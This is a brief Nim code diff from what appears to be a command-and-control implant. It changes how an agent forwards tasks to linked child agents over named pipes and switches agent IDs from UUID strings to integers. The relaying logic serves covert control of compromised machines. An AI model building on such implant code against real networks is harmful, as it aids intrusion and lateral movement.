@@ -20,17 +20,18 @@ proc sendData*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} =
     when defined(TRANSPORT_SMB): 
         return ctx.smbWrite(data)
 
-proc forward*(ctx: AgentCtx, agentId: string, tasks: seq[seq[byte]], indirectChildTasks: seq[byte]): bool = 
+proc forward*(ctx: AgentCtx, agentId: uint32, tasks: seq[seq[byte]], indirectChildTasks: seq[byte] = @[]): bool = 
     var packer = Packer.init()
 
     # Format the forwarded data properly
-    packer.add(string.toUuid(agentId))
-    packer.add(cast[uint8](tasks.len()))
-    for task in tasks:
-        packer.addDataWithLengthPrefix(task)
+    if tasks.len() > 0:
+        packer.add(agentId)
+        packer.add(cast[uint8](tasks.len()))
+        for task in tasks:
+            packer.addDataWithLengthPrefix(task)
 
     if indirectChildTasks.len() > 0:
         packer.addData(indirectChildTasks)
     
-    let hPipe = cast[HANDLE](ctx.links[string.toUuid(agentId)]) 
+    let hPipe = cast[HANDLE](ctx.links[agentId]) 
     return hPipe.pipeWrite(packer.pack())    
